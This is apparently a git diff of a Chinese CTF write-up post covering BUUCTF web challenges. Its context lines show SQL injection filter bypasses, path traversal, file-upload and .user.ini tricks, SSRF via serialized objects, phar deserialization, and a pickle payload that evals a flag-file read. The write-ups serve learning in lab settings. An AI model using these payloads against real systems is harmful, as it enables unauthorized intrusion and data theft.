@@ -7,6 +7,10 @@ tags:
   - SSRF
   - 反序列化
   - PHP
+  - 文件包含
+  - Hash
+  - 古典密码与编码
+  - Python
 categories:
   - Web 安全
 ---
@@ -15,7 +19,7 @@ categories:
 
 <!--more-->
 
-## [HCTF 2018]WarmUp
+## \[HCTF 2018\] WarmUp
 
 F12 发现 `source.php` 得源码：
 
@@ -95,7 +99,7 @@ $_page = mb_substr(
 ?file=hint.php?../../../../../ffffllllaaaagggg
 ```
 
-## [强网杯 2019]随便注
+## \[强网杯 2019\] 随便注
 
 单引号可以发现存在注入，但尝试注入时页面返回
 
@@ -118,7 +122,7 @@ return preg_match("/select|update|delete|drop|insert|where|\./i",$inject);
 
 注意这里可以使用 `char` 绕过、大小写绕过，并且纯数字表名需要用反引号包起来。
 
-## [护网杯 2018]easy_tornado
+## \[护网杯 2018\] easy_tornado
 
 我们需要计算的 hash 是 `md5(cookie_secret+md5(filename))`，已经获得了 flag 的文件名，还需要 `cookie_secret`。由于是 tornado 框架，可以尝试 SSTI。
 
@@ -128,7 +132,7 @@ return preg_match("/select|update|delete|drop|insert|where|\./i",$inject);
 /file?filename=/fllllllllllllag&filehash=a47f809c580850840a5562488d72a3df
 ```
 
-## [SUCTF 2019]EasySQL
+## \[SUCTF 2019\] EasySQL
 
 源码泄露：
 
@@ -212,13 +216,13 @@ return preg_match("/select|update|delete|drop|insert|where|\./i",$inject);
 
 另一种办法是直接输入 `*,1`，从而构造 `select *,1||flag from Flag`，这里的 `||` 就是默认的或运算。
 
-## [HCTF 2018]admin
+## \[HCTF 2018\] admin
 
 注册时输入 unicode 字符会报错，由于开启了 debug 模式，直接可以拿到 python 的 shell，从 `index.html` 中读 flag。这个应该是 BUU 平台的非预期。
 
 实际上，本题预期解是利用 Unicode 同形字，注册 `ᴀdmin` 并登陆，然后修改密码即可修改 `admin` 的密码，但是同样出现了很多非预期，具体参考 [出题人题解](https://www.ckj123.com/?p=147)。
 
-## [RoarCTF 2019]Easy Calc
+## \[RoarCTF 2019\] Easy Calc
 
 首页可以发现 js 代码，也就是自定义的 waf：
 
@@ -272,7 +276,7 @@ if(!isset($_GET['num'])){
 /calc.php?%20num=var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))
 ```
 
-## [强网杯 2019]高明的黑客
+## \[强网杯 2019\] 高明的黑客
 
 提供了 `www.tar.gz`，里面有 3000 + 个 php 文件，都含有类似一句话的部分，但是大多不能用。需要写脚本找到能用的一句话木马：
 
@@ -310,7 +314,7 @@ for name in filenames:
             pass
 ```
 
-## [SUCTF 2019]CheckIn
+## \[SUCTF 2019\] CheckIn
 
 可以上传文件，但是会对后缀名、文件头进行检查，同时文件中不能存在 `<?`。后者用 `<script language="php">` 就可以绕过，前者可以上传图片马。随后就需要我们去包含这个图片马。
 
@@ -325,7 +329,7 @@ auto_prepend_file=1.jpg
 
 这样以后，再访问上传目录下的 `index.php` 即可。
 
-## [网鼎杯 2018]Fakebook
+## \[网鼎杯 2018\] Fakebook
 
 首先通过 `robots.txt` 发现 `user.php.bak`：
 
@@ -405,9 +409,7 @@ echo serialize($a);
 no=-1'union/**/select 1,2,3,'O:8:"UserInfo":3:{s:4:"name";s:4:"merc";s:3:"age";i:10;s:4:"blog";s:29:"file:///var/www/html/flag.php";}'--
 ```
 
-## [De1CTF 2019]SSRF Me
-
-iec
+## \[De1CTF 2019\] SSRF Me
 
 ```python
 from flask import Flask
@@ -544,7 +546,7 @@ r = requests.get(base +'De1ta?param='+url, cookies=cookies)
 print(r.text)
 ```
 
-## [RoarCTF 2019]Easy Java
+## \[RoarCTF 2019\] Easy Java
 
 容易发现任意文件下载漏洞，我们可以下载 `WEB-INF/web.xml`，注意必须通过 POST 方式。可以发现存在 `FlagController`，然后去下载 `FlagController`：
 
@@ -554,7 +556,7 @@ filename=WEB-INF/classes/com/wm/ctf/FlagController.class
 
 jd-gui 反编译可以发现 flag 的 base64 编码。
 
-## [0CTF 2016]piapiapia
+## \[0CTF 2016\] piapiapia
 
 扫目录得 `www.zip`，发现正常注册登陆后可以修改档案，随后查看档案时存在反序列化操作，而其中图片是通过 `file_get_contents` 获取的，可以用来读关键文件 `config.php`。
 
@@ -629,7 +631,7 @@ config.php
 ------WebKitFormBoundary8V1KsQLRGLqfB6An--
 ```
 
-## [BUUCTF 2018]Online Tool
+## \[BUUCTF 2018\] Online Tool
 
 [参考文章](https://paper.seebug.org/164/)。
 
@@ -655,7 +657,7 @@ payload：
 
 然后访问沙箱即可。
 
-## [SUCTF 2019]Pythonginx
+## \[SUCTF 2019\] Pythonginx
 
 ```py
 @app.route('/getUrl', methods=['GET', 'POST'])
@@ -685,7 +687,7 @@ def getUrl():
 
 然后，题目还提示了 nginx，因此可以想到用 `file` 协议读取 nginx 配置文件，得到 flag 位置，恰好也位于 `/usr` 目录下，因此直接读即可。
 
-## [CISCN2019 华北赛区 Day1 Web1]Dropbox
+## \[CISCN2019 华北赛区 Day1 Web1\] Dropbox
 
 [参考](https://paper.seebug.org/680/)
 
@@ -956,7 +958,7 @@ $phar->stopBuffering();
 
 然后将 `php.ini` 中的 `phar.readonly` 设为 `Off`，运行得到 `1.phar`，上传并抓包，更改文件名为 `1.gif`，更改 `Content-Type` 为 `image/gif` 即可成功上传。最后删除，更改文件名为 `phar://1.gif`，触发 `unlink` 读取 flag。
 
-## [ASIS 2019]Unicorn shop
+## \[ASIS 2019\] Unicorn shop
 
 本题需要花费 1337 购买超级独角兽，但输入的价格只能是一个字符。查看源代码发现提示和 UTF8 相关，因此去查询 Unicode 中数值大于 1337 的字符的 UTF8 编码，举个例子：
 
@@ -966,7 +968,7 @@ id=4&price=%e1%8d%bc
 
 这个字符代表一万，因此可以购买。[查询网站](https://www.compart.com/en/unicode/)
 
-## [CISCN2019 华北赛区 Day1 Web2]ikun
+## \[CISCN2019 华北赛区 Day1 Web2\] ikun
 
 首先需要找到 `lv6`，页数很多，写脚本跑一下：
 
@@ -1022,7 +1024,7 @@ print urllib.quote(p)
 c__builtin__%0Aeval%0Ap0%0A%28S%27open%28%22/flag.txt%22%2C%22r%22%29.read%28%29%27%0Ap1%0Atp2%0ARp3%0A.
 ```
 
-## [GYCTF2020] Blacklist
+## \[GYCTF2020\] Blacklist
 
 存在过滤语句 `return preg_match("/set|prepare|alter|rename|select|update|delete|drop|insert|where|\./i",$inject);`，无法 `select`，可以考虑堆叠注入：
 
@@ -1037,7 +1039,7 @@ c__builtin__%0Aeval%0Ap0%0A%28S%27open%28%22/flag.txt%22%2C%22r%22%29.read%28%29
 -1';handler FlagHere open; handler FlagHere read first; handler close;#
 ```
 
-## [安洵杯 2019]easy_serialize_php
+## \[安洵杯 2019\] easy_serialize_php
 
 ```php
 <?php
@@ -1106,7 +1108,7 @@ a:3:{s:4:"user";s:24:"";s:8:"function";s:59:"a";s:3:"img";s:20:"ZDBnM19mMWFnLnBo
 
 此时，`user` 字段向后读 24 字符，其值为 `";s:8:"function";s:59:"a`，随后是我们控制的 `img` 字段和 `dd` 字段（注意需满足长度为 59），`}` 后的内容被忽略。此时我们就成功控制了 `img`，读到了 `d0g3_f1ag.php`。文件内容指向另一个文件，同样方法读取即可。
 
-## [网鼎杯 2018]Comment
+## \[网鼎杯 2018\] Comment
 
 存在 `.git` 泄露，`GitHack` 发现恢复的文件不全，然后通过 `git log --reflog` 发现了一个 `stashed` 的记录，用 `git reset --hard xxx` 回滚到该记录得到完整代码：
 
